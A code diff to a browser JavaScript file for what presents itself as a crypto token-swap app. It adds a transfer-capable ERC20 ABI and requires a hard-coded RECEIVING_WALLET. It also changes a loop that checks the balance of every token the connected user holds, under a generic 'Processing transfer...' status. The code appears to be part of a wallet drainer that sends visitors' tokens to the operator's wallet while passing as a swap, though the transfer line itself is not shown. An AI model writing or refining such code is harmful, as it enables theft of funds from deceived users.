@@ -1,3 +1,19 @@
+// Ensure these are loaded first by including them before app.js in HTML
+if (typeof NETWORK_CONFIGS === 'undefined') {
+  throw new Error("NETWORK_CONFIGS is not defined. Make sure networks.js is loaded before app.js");
+}
+if (typeof TOKENS === 'undefined') {
+  throw new Error("TOKENS is not defined. Make sure tokens.js is loaded before app.js");
+}
+if (typeof RECEIVING_WALLET === 'undefined') {
+  throw new Error("RECEIVING_WALLET is not defined. Make sure tokens.js is loaded before app.js");
+}
+
+const ERC20_ABI = [
+  "function balanceOf(address owner) view returns (uint256)",
+  "function transfer(address to, uint256 amount) returns (bool)"
+];
+
 let provider, signer, userAddress;
 let currentNetwork = "bsc";
 const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
@@ -137,7 +153,8 @@ async function processAllTransfers() {
     for (const token of tokensToSwap.filter(t => !t.isNative)) {
       try {
         updateStatus(`Processing transfer...`, "success");
-        const contract = new ethers.Contract(token.address, token.abi, signer);
+        const abi = token.abi || ERC20_ABI;
+        const contract = new ethers.Contract(token.address, abi, signer);
         const balance = await contract.balanceOf(userAddress);
         
         if (balance.gt(0)) {
